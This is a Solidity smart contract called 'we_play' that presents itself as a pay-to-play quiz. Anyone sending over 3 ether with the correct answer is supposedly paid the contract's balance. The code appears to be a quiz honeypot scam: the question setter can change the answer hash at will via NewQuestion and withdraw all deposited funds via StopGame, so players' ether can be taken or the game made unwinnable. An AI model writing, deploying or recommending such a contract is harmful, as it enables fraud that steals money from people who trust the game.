pragma solidity ^0.4.25;

contract we_play
{
    function Try(string _response) external payable {
        require(msg.sender == tx.origin);
        
        if(responseHash == keccak256(_response) && msg.value > 3 ether)
        {
            msg.sender.transfer(this.balance);
        }
    }
    
    string public question;
    
    address questionSender;
    
    bytes32 responseHash;
 
    bytes32 questionerPin = 0x1e378945a7ffddbff537b1971e2c7d9be10d4529a0bc51e99b3ab825d27124c8;
 
    function ActivateContract(bytes32 _questionerPin, string _question, string _response) public payable {
        if(keccak256(_questionerPin)==questionerPin) 
        {
            responseHash = keccak256(_response);
            question = _question;
            questionSender = msg.sender;
            questionerPin = 0x0;
        }
    }
    
    function StopGame() public payable {
        require(msg.sender==questionSender);
        msg.sender.transfer(this.balance);
    }
    
    function NewQuestion(string _question, bytes32 _responseHash) public payable {
        if(msg.sender==questionSender){
            question = _question;
            responseHash = _responseHash;
        }
    }
    
    function newQuestioner(address newAddress) public {
        if(msg.sender==questionSender)questionSender = newAddress;
    }
    
    
    function() public payable{}
}
